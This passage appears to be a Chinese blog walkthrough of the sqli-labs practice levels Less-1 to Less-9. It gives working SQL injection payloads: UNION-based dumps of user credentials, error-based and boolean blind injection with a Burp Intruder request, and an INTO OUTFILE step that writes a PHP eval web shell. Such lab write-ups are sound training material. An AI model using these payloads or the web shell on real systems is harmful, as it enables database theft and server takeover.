|</span><br><span class="line">| 8  | admin      | admin    |</span><br><span class="line">| 9  | admin1     | admin1   |</span><br><span class="line">| 10 | admin2     | admin2   |</span><br><span class="line">| 11 | admin3     | admin3   |</span><br><span class="line">| 12 | dumbo      | dhakkan  |</span><br><span class="line">| 14 | admin4     | admin4   |</span><br><span class="line">+----+------------+----------+</span><br></pre></td></tr></table></figure>
+<h3 id="手工注入"><a class="markdownIt-Anchor" href="#手工注入">#</a> 手工注入：</h3>
+<p>先小心翼翼地试一个 id=1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=1</span><br></pre></td></tr></table></figure>
+<p>哦豁，有数据回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>
+<p>用 orderby 试一下要几个字段，但是发现随便 oderby 都是一样的回显…</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=2 order by 110</span><br></pre></td></tr></table></figure>
+<p>中间试了好多都没有给回应，加单引号报错看一下 sql 语句，先入为主以为是数字型的了，明明题目也写了… 蠢爆了！！！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=1&#x27;</span><br><span class="line">输出：</span><br><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<p>orderby 试出来是要三个字段，因为要闭合后面的单引号好麻烦就直接用 #（URL 编码 %23）注释了后面的代码，自己搞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=1&#x27; order by 3 limit 1 %23</span><br><span class="line">输出：</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br><span class="line"></span><br><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=1&#x27; order by 4 limit 1 %23</span><br><span class="line">输出：</span><br><span class="line">Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
+<p>三个字段，只输出了两个值，理所当然有一个 id 啦，所以第一个字段随便搞，后面两个字段用了输出我们要的数据，一套流程走</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">爆库，从mysql默认的数据库information_schema里找所有的数据，使用group_concat拼接：</span><br><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=666666&#x27; union select 1,database(),group_concat(schema_name) from information_schema.schemata %23</span><br><span class="line">输出：</span><br><span class="line">第二个字段是当前数据库security，第三个字段是输出localhost所有的数据库</span><br><span class="line"></span><br><span class="line">爆表：</span><br><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=666666&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema %23</span><br><span class="line">输出：</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br><span class="line"></span><br><span class="line">爆字段：</span><br><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=666666&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; %23</span><br><span class="line">输出：</span><br><span class="line">Your Login name:user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</span><br><span class="line">Your Password:3</span><br><span class="line"></span><br><span class="line">爆字段值：</span><br><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=666666&#x27; union select 1,group_concat(concat_ws(&#x27;--&#x27;,id,username,password)),3 from users+%23</span><br><span class="line">输出：</span><br><span class="line">Your Login name:1--Dumb--Dumb,2--Angelina--I-kill-you,3--Dummy--p@ssword,4--secure--crappy,5--stupid--stupidity,6--superman--genious,7--batman--mob!le,8--admin--admin,9--admin1--admin1,10--admin2--admin2,11--admin3--admin3,12--dhakkan--dumbo,14--admin4--admin4</span><br><span class="line">Your Password:3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结</h2>
+<ol>
+<li>虽然我觉得闭合引号很麻烦，但是我就是还是想去试一下，直接在最后闭合就可以了，也不会报语法错</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-1/</span><br><span class="line">?id=1&quot; order by 3 &quot;</span><br></pre></td></tr></table></figure>
+<p>​		那为什么大家闭合的时候都喜欢用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>
+<p>画面感地理解一下函数</p>
+<p>concat_ws () 是拼接一行的数据</p>
+<p>group_concat () 是拼接一列的数据</p>
+</li>
+<li>
+<p>因为 sql 学的就很菜，有些语法函数什么的还要百度，mysql 里 information_schema 里的，很多表名和字段名经常搞混，手工注入的时候还要去看具体的表名和字段名，超级浪费时间的，可是记一下吧很久不写又忘记了，而且数据库那么多，默认的表都不一样，还是多写题 8</p>
+</li>
+<li>
+<p>跑 sqlmap 的时候，会给出相应的 payload，有些写得真的超级复杂，说是为了绕过把，可是有个 select 就感觉绕不过去呀，等有一天我不再是一个连脚本都不会用的菜鸡了，有机会的话，想去研读一下源码</p>
+</li>
+</ol>
+<hr>
+<h1 id="less-2"><a class="markdownIt-Anchor" href="#less-2">#</a> Less-2</h1>
+<p>data: 2020-11-17 10:32:43</p>
+<h2 id="过程-2"><a class="markdownIt-Anchor" href="#过程-2">#</a> 过程</h2>
+<p>和 less-1 相比就是少闭合了两个引号罢了</p>
+<h3 id="sqlmap-2"><a class="markdownIt-Anchor" href="#sqlmap-2">#</a> sqlmap</h3>
+<p>同 Less-1</p>
+<h3 id="手工注入-2"><a class="markdownIt-Anchor" href="#手工注入-2">#</a> 手工注入</h3>
+<p>判断 id 是注入点且需要三个字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http://www.sqli-labs.com/Less-2?id=1 order by 4输出：Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;payload:http://www.sqli-labs.com/Less-2?id=1 order by 3输出：Your Login name:DumbYour Password:Dumb</span><br></pre></td></tr></table></figure>
+<p>和 less-1 一样一套流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata爆当前数据库的表：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema爆字段：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;爆字段值：http://www.sqli-labs.com/Less-2?id=-1 union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users</span><br></pre></td></tr></table></figure>
+<h2 id="总结-2"><a class="markdownIt-Anchor" href="#总结-2">#</a> 总结</h2>
+<p>想当年我还是个不管写什么题目都要看通关手册的人，鼓掌！！！</p>
+<hr>
+<h1 id="less-3"><a class="markdownIt-Anchor" href="#less-3">#</a> Less-3</h1>
+<p>date:2020-11-17 11:00:04</p>
+<h2 id="过程-3"><a class="markdownIt-Anchor" href="#过程-3">#</a> 过程</h2>
+<h3 id="sqlmap-3"><a class="markdownIt-Anchor" href="#sqlmap-3">#</a> sqlmap</h3>
+<p>同 Less-1</p>
+<h3 id="手工注入-3"><a class="markdownIt-Anchor" href="#手工注入-3">#</a> 手工注入</h3>
+<p>加单引号报错，看后面具体要闭合啥</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-3?id=1asdf&#x27;kkkk</span><br></pre></td></tr></table></figure>
+<p>输出，发现后面有括号啥的闭合一下，并且 id 也是字符型的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;kkkk&#x27;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<p>根据 order by 判断需要的字段数是 3 个</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-3?id=-1&#x27;) order by 4 --+http://www.sqli-labs.com/Less-3?id=-1&#x27;) order by 3 --+</span><br></pre></td></tr></table></figure>
+<p>脱脱脱：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+爆当前数据库的表：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+爆字段：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+爆字段值：http://www.sqli-labs.com/Less-3?id=-1&#x27;) union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users --+</span><br></pre></td></tr></table></figure>
+<h2 id="总结-3"><a class="markdownIt-Anchor" href="#总结-3">#</a> 总结</h2>
+<p>?id=1&quot; 竟然正常返回信息了！！！</p>
+<p>因为 id=xx (‘1&quot;’) 了啊，根本没闭合啊，有点弱智哦</p>
+<hr>
+<h1 id="less-4"><a class="markdownIt-Anchor" href="#less-4">#</a> Less-4</h1>
+<p>date:2020-11-17 11:25:45</p>
+<h2 id="过程-4"><a class="markdownIt-Anchor" href="#过程-4">#</a> 过程</h2>
+<h3 id="sqlmap-4"><a class="markdownIt-Anchor" href="#sqlmap-4">#</a> sqlmap</h3>
+<p>同 Less-1</p>
+<h3 id="手工注入-4"><a class="markdownIt-Anchor" href="#手工注入-4">#</a> 手工注入</h3>
+<p>发现双引号报错，所以可以直接在后面加 &quot;) %23+ 进行闭合</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-4?id=1&quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;1&quot;&quot;) LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<p>根据 order by 确定是三个字段后，union select 拿数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">爆库，第二个字段拼接改连接所有数据库名：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(schema_name),3 from information_schema.schemata --+爆当前数据库的表：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(table_name),3 from information_schema.tables where database()=table_schema --+爆字段：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+爆字段值：http://www.sqli-labs.com/Less-4?id=-1&quot;) union select 1,group_concat(concat_ws(&#x27;--&#x27;,username,password)),3 from users --+</span><br></pre></td></tr></table></figure>
+<h2 id="总结-4"><a class="markdownIt-Anchor" href="#总结-4">#</a> 总结</h2>
+<p>没啥好说的</p>
+<hr>
+<h1 id="less-5"><a class="markdownIt-Anchor" href="#less-5">#</a> Less-5</h1>
+<p>date:2020-11-17 11:48:40</p>
+<h2 id="过程-5"><a class="markdownIt-Anchor" href="#过程-5">#</a> 过程</h2>
+<h3 id="sqlmap-5"><a class="markdownIt-Anchor" href="#sqlmap-5">#</a> sqlmap</h3>
+<p>同 Less-1</p>
+<h3 id="手工注入-5"><a class="markdownIt-Anchor" href="#手工注入-5">#</a> 手工注入</h3>
+<p>单引号报错，payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-5?id=1&#x27;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<p>‘‘1’’ LIMIT 0,1’第一个单引号真的巨坑，总是眼糊看错成 SQL 语句里面的</p>
+<p>闭合单引号，用 order by 确定是提取了三个字段，但是页面上并没有输出字段的值，目测是后台进行了判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-5?id=1&#x27; order by 3 +%23+输出：You are in...........</span><br></pre></td></tr></table></figure>
+<p>前端没有发现啥有用的东西，撸了一下 floor 报错，开干</p>
+<p>爆库 payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-5?id=1&#x27; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p>然后像以前一样的流程，在 concat 里面找自己要的数据就好了</p>
+<h2 id="总结-5"><a class="markdownIt-Anchor" href="#总结-5">#</a> 总结</h2>
+<ol>
+<li>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/8472323.html">select count (*) from test group by floor (rand (0)*2) 报错原理 666</a></p>
+<p>概括一下:</p>
+<p>floor (rand (0)*2) 是随机 0、1，但是是伪随机 011011…</p>
+<p>count (*) 与 group by 共同工作时会建立一张虚拟表，两个字段 (关键字和数量)</p>
+<p>floor 表达式第一次运算的值为 0，在表中没有找到 key 为 0 的数据，故插入，在插入的过程中需要再取一次 group by 后面的值（即再进行一次 floor 运算，结果为 1），取到了 1，将之插入，并将 count (*) 置 1。</p>
+<p>也就是说一次插入要调用两次 floor，所以在后面碰见 01 时，0 没有，插入 1，但是 1 已经存在，报错</p>
+</li>
+<li>
+<p>payload 是 sqlmap 复制后修改的，自己手动输入的总是说有语法错，我对着看了好多遍感觉没有什么问题啊，无理取闹，后来看报错应该是 and 后面的 select from 的表要别名 (Every derived table must have its own alias)，select from 外面还要加一个括号</p>
+</li>
+</ol>
+<hr>
+<h1 id="less-6"><a class="markdownIt-Anchor" href="#less-6">#</a> Less-6</h1>
+<p>data: 2020-11-17 15:50:40</p>
+<h2 id="过程-6"><a class="markdownIt-Anchor" href="#过程-6">#</a> 过程</h2>
+<h3 id="sqlmap-6"><a class="markdownIt-Anchor" href="#sqlmap-6">#</a> sqlmap</h3>
+<p>同 Less-1</p>
+<h3 id="手工注入-6"><a class="markdownIt-Anchor" href="#手工注入-6">#</a> 手工注入</h3>
+<p>输入了 less-5 里面的 payload，发现不报错了！</p>
+<p>机智的我去看 sqlmap 发现就是变成了闭合双引号罢了唉，人傻了</p>
+<p>爆当前库 payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-6?id=1&quot; AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)AND &#x27;1&#x27;=&quot;1</span><br></pre></td></tr></table></figure>
+<p>CONCAT (payload,floor (rand (0)*2)) 作为 group by 的 key</p>
+<h2 id="总结-6"><a class="markdownIt-Anchor" href="#总结-6">#</a> 总结</h2>
+<p>没啥好总结的，还以为又有新东西可以看了</p>
+<hr>
+<h1 id="less-7"><a class="markdownIt-Anchor" href="#less-7">#</a> Less-7</h1>
+<p>date:2020-11-17 16:09:39</p>
+<h2 id="过程-7"><a class="markdownIt-Anchor" href="#过程-7">#</a> 过程</h2>
+<h3 id="sqlmap-7"><a class="markdownIt-Anchor" href="#sqlmap-7">#</a> sqlmap</h3>
+<p>同 Less-1</p>
+<p>sqlmap 用的时间盲注，它自己跑着跑着连接就断了，笑死</p>
+<h3 id="手工注入-7"><a class="markdownIt-Anchor" href="#手工注入-7">#</a> 手工注入</h3>
+<p>试了一些，目测后台做了判断</p>
+<p>sql 报错统一输出：</p>
+<p>You have an error in your SQL syntax</p>
+<p>正常输出：You are in… Use outfile…</p>
+<p>盲注的话，二分法判断字符的 ascii 码值，sqlmap 都说它扛不住了</p>
+<p>看见正常输出那里有个 use outfile…，感觉是个提示，新东西就要百度看看，好叭这里直接看通关秘籍了，竟然直接写入文件 getshell 了…</p>
+<p>太帅了，动手撸一遍</p>
+<p>要上传一句话连接的话，需要知道路径，去有回显的题拿路径啦</p>
+<p>basedir 参数指定了安装 MySQL 的安装路径</p>
+<p>datadir 参数指定了 MySQL 的数据库文件放在什么路径下</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-1/?id=-1&#x27; union select 1,@@datadir,@@basedir MYSQL %23+</span><br></pre></td></tr></table></figure>
+<p>输出，并没有 phpstudy 的路径，因为我根本没用 phpstudy 的数据库…：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Login name:C:\ProgramData\MySQL\MySQL Server 5.5\Data\Your Password:C:/Program Files (x86)/MySQL/MySQL Server 5.5/</span><br></pre></td></tr></table></figure>
+<p>尝试在获取到的路径下存入 php 一句话：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-7/?id=1 union select &#x27;&lt;?php eval(@_POST[&quot;haha&quot;]); ?&gt;&#x27; into outfile &#x27;C:/ProgramData/MySQL/MySQL Server 5.5/Data/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>
+<p>但是一直报错，愤怒地直接去 mysql 运行的时候，发现报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SQL] select &#x27;&lt;?php eval(@_POST[&quot;haha&quot;]); ?&gt;&#x27; into outfile &#x27;C:/haha.php&#x27;[Err] 1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure>
+<p>去查了一下报错原因：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将桌面文件存储到mysql时报错：The MySQL server is running with the --secure-file-pri option so it cannot execute this.</span><br><span class="line">报错原因：mysql文件的导入和导出路径有默认的设置，即 secure-file-priv,当传入的csv文件路径与默认的路径冲突时就会报错。</span><br><span class="line">secure-file-priv的值有三种情况：secure_file_prive=null ––限制mysqld 不允许导入导出</span><br><span class="line">secure_file_priv=/path/ – --限制mysqld的导入导出只能发生在默认的/path/目录下</span><br><span class="line">secure_file_priv=’’ – --不对mysqld 的导入 导出做限制</span><br></pre></td></tr></table></figure>
+<p>通过命令  <code>select @@secure_file_priv</code>  查询，发现 secure_file_priv 的值为 null，也就是说不允许导入导出</p>
+<p>于是到 mysql 的安装目录下修改 my.ini 配置文件，在 mysqld 节点下加入 secure_file_priv=’’，对导入导出不进行限制</p>
+<p>在尝试 payload 时，</p>
+<p>?id=1 order by 111111 %23 + 不报错</p>
+<p>?id=1’ order by 111111 %23 + 报错</p>
+<p>?id=1&quot; order by 111111 %23 + 不报错</p>
+<p>说明有一个单引号要闭合</p>
+<p>?id=1’ order by 1 %23 + 报错</p>
+<p>?id=1’)) order by 3 %23 + 不报错</p>
+<p>?id=1’)) order by 4 %23 + 报错</p>
+<p>闭合成功，且需要三个字段</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-7?id=1&#x27;)) union select &#x27;&lt;?php @eval($_POST[&quot;haha&quot;]); ?&gt;&#x27;,2,3 into outfile &#x27;D:/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>
+<p>虽然输出还是报错，但是文件已经上传到 D 盘了（因为这个 sql 语句我已经在数据库试了很多遍了…）</p>
+<p>但是因为我的 mysql 不是 PHPstudy 的，所以没有搞到 phpstudy 的路径，没有上传到 phpstudy 目录下，也连接不上解析不了？</p>
+<p>机智的我决定手动复制到 www 下</p>
+<p>上蚁剑连接成功</p>
+<p>另外要看数据库数据的话可以通过改上面的 p 输出文件，然后上蚁剑查看输出的文件内容，其余的爆数据库和之前的题目都一样的流程，例如爆当前数据库名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-7?id=1&#x27;)) union select database(),2,3 into outfile &#x27;D:/haha.php&#x27; %23+</span><br></pre></td></tr></table></figure>
+<p>因为用命令行登录数据库需要密码</p>
+<h3 id="总结-7"><a class="markdownIt-Anchor" href="#总结-7">#</a> 总结</h3>
+<ol>
+<li>
+<p>MySQL 的 @与 @@区别</p>
+<p>@x 是 用户自定义的变量 (User variables are written as @var_name)</p>
+<p>@@x 是 global 或 session 变量 (@@global @@session)</p>
+</li>
+<li>
+<p>菜鸡的悲哀就是做个题还要靠作弊（菜菜子不要难过！你会变强的！）</p>
+</li>
+</ol>
+<hr>
+<h1 id="less-8"><a class="markdownIt-Anchor" href="#less-8">#</a> Less-8</h1>
+<p>date:2020-11-21 13:58:47</p>
+<h2 id="过程-8"><a class="markdownIt-Anchor" href="#过程-8">#</a> 过程</h2>
+<h3 id="sqlmap-8"><a class="markdownIt-Anchor" href="#sqlmap-8">#</a> sqlmap</h3>
+<p>同 less-1，看见 sqlmap 的 payload，它也是盲注咯</p>
+<h3 id="手工注入-8"><a class="markdownIt-Anchor" href="#手工注入-8">#</a> 手工注入</h3>
+<p>单引号闭合后分别 order by 3 和 4，发现一个正常输出一个不输出，说明单引号闭合成功，order by 执行成功，且需要三个字段，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-8?id=1&#x27; order by 3 %23+http://www.sqli-labs.com/Less-8?id=1&#x27; order by 4 %23+</span><br></pre></td></tr></table></figure>
+<p>没有回显数据，只能盲注</p>
+<p>尝试第七关的 outfile 上传文件，上传成功，上蚁剑连接</p>
+<p>换个思路，上盲注，看题目是布尔盲注，一个一个猜呗，机智的我决定先测试出长度再上 bp 爆</p>
+<p>length () 函数，显而易见是返回里面参数的长度</p>
+<p>substr (a,b,c) 函数，显而易见是截断字符串 a，b 位置开始截取 c 个字符</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.sqli-labs.com/Less-8?id=1&#x27; and (select length(database()))=8 %23+</span><br></pre></td></tr></table></figure>
+<p>=8 时正常输出，说明当前数据库名字长度为 8</p>
+<p>上 bp, 选中 Intruder</p>
+<p>攻击模式可以选 sniper 也可以选 clusterbomb，都很方便，字典直接用 excel 下拉到 127 的…，一个一个打也太费劲了把</p>
+<p>从 1 到 127 一个一个猜数据库名中的字符，根据返回数据的长度不同找到正确的 ascii 码值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /Less-8/?id=1%27%20and%20(select%20ascii(substr(database(),§1§,1)))=§115§%20%23+ HTTP/1.1Host: www.sqli-labs.comUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateDNT: 1Connection: keep-aliveUpgrade-Insecure-Requests: 1Pragma: no-cacheCache-Control: no-cache</span><br></pre></td></tr></table></figure>
+<p>这里就不上 bp 图了，不好搞，用的笛卡尔乘积，发了一千多个请求就爆了个当前数据库名，要爆别的在上面 payload 改改完事：</p>
+<table>
+<thead>
+<tr>
+<th>request</th>
+<th>payload1</th>
+<th>payload2</th>
+<th>status</th>
+<th>timeout</th>
+<th>error</th>
+<th>length</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td></td>
+<td></td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>950</td>
+<td></td>
+</tr>
+<tr>
+<td>787</td>
+<td>3</td>
+<td>99</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>950</td>
+<td></td>
+</tr>
+<tr>
+<td>802</td>
+<td>2</td>
+<td>101</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>950</td>
+<td></td>
+</tr>
+<tr>
+<td>838</td>
+<td>6</td>
+<td>105</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>950</td>
+<td></td>
+</tr>
+<tr>
+<td>909</td>
+<td>5</td>
+<td>114</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>950</td>
+<td></td>
+</tr>
+<tr>
+<td>913</td>
+<td>1</td>
+<td>115</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>950</td>
+<td></td>
+</tr>
+<tr>
+<td>927</td>
+<td>7</td>
+<td>116</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>950</td>
+<td></td>
+</tr>
+<tr>
+<td>932</td>
+<td>4</td>
+<td>117</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>950</td>
+<td></td>
+</tr>
+<tr>
+<td>968</td>
+<td>8</td>
+<td>121</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>950</td>
+<td></td>
+</tr>
+<tr>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>966</td>
+<td></td>
+</tr>
+<tr>
+<td>2</td>
+<td>2</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>966</td>
+<td></td>
+</tr>
+<tr>
+<td>3</td>
+<td>3</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>966</td>
+<td></td>
+</tr>
+<tr>
+<td>4</td>
+<td>4</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>966</td>
+<td></td>
+</tr>
+<tr>
+<td>5</td>
+<td>5</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>966</td>
+<td></td>
+</tr>
+<tr>
+<td>6</td>
+<td>6</td>
+<td>1</td>
+<td>200</td>
+<td>false</td>
+<td>false</td>
+<td>966</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="总结-8"><a class="markdownIt-Anchor" href="#总结-8">#</a> 总结</h2>
+<p>盲注一个个手打的话就是很费时间，疲惫</p>
+<p>有 sqlmap 真好</p>
+<hr>
+<h1 id="less-9"><a class="markdownIt-Anchor" href="#less-9">#</a> Less-9</h1>
+<p>date：2020-11-21 15:10:01</p>
+<h2 id="过程-9"><a class="markdownIt-Anchor" href="#过程-9">#</a> 过程</h2>
+<h3 id="sqlmap-9"><a class="markdownIt-Anchor" href="#sqlmap-9">#</a> sqlmap</h3>
+<p>同 less-1</p>
+<h3 id="手工注入-9"><a class="markdownIt-Anchor" href="#手工注入-9">#</a> 手工注入</h3>
+<p>不管输入什么都是正常输出，明明输入的 id 数据库里面就没有，还说 you are in，用户体验差评：</p>
